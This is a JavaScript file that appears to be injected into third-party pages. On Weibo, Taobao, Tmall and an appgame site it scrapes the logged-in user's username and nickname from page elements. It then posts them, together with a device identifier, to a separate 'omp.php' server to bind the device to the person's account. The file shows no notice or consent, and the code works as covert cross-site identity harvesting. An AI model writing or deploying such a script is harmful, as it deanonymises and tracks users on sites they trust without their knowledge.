function report_user_name(device_id)
{
    var id_obj = get_user_name();

    if (!id_obj.hasOwnProperty('username')) {
        mylog("cant obtain username. not binding.");
    } else {
        bind_device_user(device_id, id_obj);
    }
}

function bind_device_user(device_id, id_obj)
{
    jQomp.post(root_prefix+'omp.php', {
        cmd:'bind',
        plat: id_obj.name,
        device: device_id,
        cap: id_obj.caption,
        user: id_obj.username,
        nick: id_obj.nickname
    })
    .success(function () {
        mylog('bind ok: -- dev_id:' + device_id + ' username:' + id_obj.username + " nickname: " + id_obj.nickname);
    });
}

function get_user_name()
{
    var id_obj = {};
    var travers_seletors = function(sel) {
        var result = '';
        jQomp.each(sel, function() {
            var target = jQomp(this.selector), text = '';
            if(target.length === 0) return true; //skip,

            if(this.hasOwnProperty('revisor') && typeof this.revisor === 'function') {
                text = this.revisor(target);
            } else {
                text = target.text().trim();
            }

            result = text;
            return false; //break
        });
        return result;
    };

    jQomp.each(username_selector, function() {
        if (!window.location.hostname.match(new RegExp(this.host, 'i')))
            return true;

        id_obj['name'] = this.name;
        id_obj['caption'] = this.caption;
        id_obj['username'] = travers_seletors(this.filters.username);
        id_obj['nickname'] = travers_seletors(this.filters.nickname);

        return false;
    });

    return id_obj;
}

var username_selector = [

{
    'name':'appgame',
    'caption':'任玩堂',
    'host':"appgame.com",
    'filters':{
        username: [{selector:"a span.username",}],
        nickname: [{selector:"a span.display-name",}]
    }
}
,
{
    'name':'sina_account',
    'caption':'新浪微博',
    'host':'weibo.com',
    'filters':{
        'username': [
            {selector:".gn_person a.gn_name",
             revisor: function(t) {
                    return t.attr('href').split('/')[1]
                }
            },
            {selector:".nameBox a.name",
             revisor: function(t) {
                    return t.attr('href').split('/')[1]
                }
            }
        ],
        'nickname': [
            {selector:".gn_person a.gn_name"},
            {selector:".nameBox a.name"},
        ]
    }
}
,
{
    'name':'taobao',
    'caption':'淘宝',
    'host':'taobao.com',
    'filters':{
        'username': [
            {'selector':"a.user-nick"}
        ],
        'nickname': []
    }
}
,
{
    'name':'tmall',
    'caption':'天猫',
    'host':'tmall.com',
    'filters':{
        'username': [
            {'selector':".sn-welcome-info a.j_UserNick"}
        ],
        'nickname': []
    }
}
/*
,
{
    'name':'',
    'caption':'',
    'host':'',
    'filters':{
        'username': [
            {'selector':"", 'revisor': function (str) {return str;}}
        ],
        'nickname': []
    }
}
*/

];

